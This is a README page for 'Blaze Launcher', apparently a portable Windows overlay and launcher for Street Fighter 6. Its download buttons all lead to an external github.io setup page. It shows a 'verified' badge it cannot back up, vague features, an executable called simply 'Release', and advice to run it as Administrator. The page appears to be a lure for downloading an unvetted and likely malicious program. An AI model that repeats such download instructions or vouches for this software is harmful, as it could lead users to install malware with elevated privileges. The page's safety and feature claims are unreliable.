# Blaze‑Launcher‑Street‑Fighter‑6

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-b45309?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-9333ea?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/CONFIGS-PRESETS-db2777?style=for-the-badge&logo=files&logoColor=white&labelColor=161b22" alt="CONFIGS"></a>
  <br>
  <a href="#-frequently-asked-questions"><img src="https://img.shields.io/badge/FAQ-ANSWERS-16a34a?style=for-the-badge&logo=book&logoColor=white&labelColor=161b22" alt="FAQ"></a> <a href="#-overview"><img src="https://img.shields.io/badge/OVERVIEW-DOCS-0891b2?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=161b22" alt="OVERVIEW"></a>
</div>

**Author:** IntersectScholar
**Platform:** Windows 10 / Windows 11 (only)
**Category:** Desktop manager, live overlay, release bundle

---

## 🎮 What is Blaze Launcher?

Blaze Launcher is a **stand‑alone Windows desktop manager** built especially for **Street Fighter 6**.
It gives you a sleek, always‑on‑top overlay, quick‑launch shortcuts, and a bundled set of resources so you can jump straight into the fight without fiddling with separate installers.

### Key Features

| ✅ | Feature |
|---|---|
| **Live Overlay** | Real‑time FPS / latency stats, customizable skins, and instant match notifications. |
| **One‑Click Launch** | Launch the game, the utility, or the community server with a single button. |
| **Release Bundle** | Includes the latest patches, community‑approved configs, and optional streaming utility. |
| **Windows‑Only Optimizations** | Tailored for the Windows 10/11 graphics stack, low‑latency input handling, and native DirectX integration. |
| **Portable Mode** | Run from a USB stick or any folder – no system‑wide installation required. |

---

## 📥 Download & Get Started

<div style="text-align:center; margin: 1.5rem 0;">
  <a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="background:#0078d7;color:#fff;padding:0.8rem 1.6rem;border-radius:6px;text-decoration:none;font-weight:bold;font-family:Arial,Helvetica,sans-serif;">🚀 Get Blaze Launcher</a>
</div>

1. Click the button above to open the official Release page.
2. Follow the on‑screen instructions (the bundle extracts itself to a folder of your choice).
3. Run **Release** from the extracted folder – the overlay will appear instantly.

> **Tip:** For the best experience, run the launcher **as Administrator** the first time to allow shortcut registration.

---

## 🛠️ Installation Guide (Portable)

1. **Extract** the downloaded ZIP to a location you control (e.g., `C:\Games\BlazeLauncher`).
2. **Open** the folder and double‑click `Release`.
3. **Configure** your overlay preferences in the Settings tab (resolution, opacity, hotkeys).
4. **Add** your Street Fighter 6 installation path (auto‑detect works for most default installs).

> No registry entries are written; you can delete the folder at any time to remove the launcher completely.

---

## 📚 Documentation & Support

- **User Manual** – located in the `Docs` subfolder (`README.pdf`).
- **FAQ** – check the `FAQ.md` file for common troubleshooting steps.
- **Community Discord** – join the official server for tips, custom skins, and real‑time help.
- **Issue Tracker** – open a GitHub issue here if you encounter bugs or have feature requests.

---

## 🛡️ Compatibility & Requirements

| Requirement | Minimum |
|---|---|
| **OS** | Windows 10 (64‑bit) or Windows 11 |
| **Processor** | Intel i5‑6600 / AMD Ryzen 5 1600 or newer |
| **Memory** | 8 GB RAM |
| **Graphics** | DirectX 12 compatible GPU (NVIDIA GTX 1060 / AMD RX 5600 XT or better) |
| **Disk Space** | ~350 MB for the launcher + optional bundles |

---

## 🚀 Quick Start (Command Line)

If you prefer launching via a script or shortcut, use the following pattern (adjust the path accordingly):

```bat
"C:\Games\BlazeLauncher\Release" -launch sf6 -overlay
```

*The `-launch` flag starts Street Fighter 6, while `-overlay` ensures the live HUD appears.*

---

## 📜 License

This project is released under the **MIT License** – you are free to use, modify, and distribute the launcher as long as the original copyright notice is retained.

---

### Stay in the Fight

> *“Play hard, launch fast, and never miss a combo.”* – IntersectScholar

*Happy battling!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```